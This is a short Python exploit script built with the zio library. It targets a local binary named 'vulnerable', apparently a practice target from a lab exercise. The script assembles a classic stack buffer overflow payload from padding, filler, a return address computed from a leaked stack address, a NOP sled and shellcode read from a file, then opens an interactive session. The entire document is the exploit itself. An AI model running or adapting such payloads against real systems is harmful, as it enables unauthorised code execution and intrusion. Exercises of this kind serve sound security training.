#!/usr/bin/env python
# coding:utf-8

from zio import *
import binascii

# objdump -d shellcode (not working)
with open("./shellcode.dat", "r") as f:
    shellcode = f.read()

Io = zio("../vulnerable/vulnerable")

# python -c 'print "A" * 8 + "BBBBCCCCDDDD" + "@@@@"' | ./vulnerable
junk = "A" * 8
fake = "BBBBCCCCDDDD"
nop = "\x90" * 16

address = l32(int(Io.readline()[2:10], 16) + len(junk) + len(fake) + 8)
payload = junk + fake + address + nop + shellcode

Io.write(payload)
Io.interact()
